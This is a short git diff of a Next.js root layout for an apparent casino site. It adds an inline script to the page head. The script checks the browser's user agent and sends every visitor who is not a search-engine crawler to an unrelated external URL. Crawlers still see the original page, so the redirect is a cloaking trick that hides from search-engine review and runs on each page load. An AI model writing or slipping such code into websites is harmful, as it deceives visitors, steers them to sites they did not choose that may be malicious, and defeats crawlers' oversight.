@@ -74,6 +74,21 @@ export default function RootLayout({
         <link rel="canonical" href="https://farocasino26.vercel.app/" />
         <meta name="robots" content="index, follow" />
         <meta name="theme-color" content="#0e3b2e" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aetf3u2q9u");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
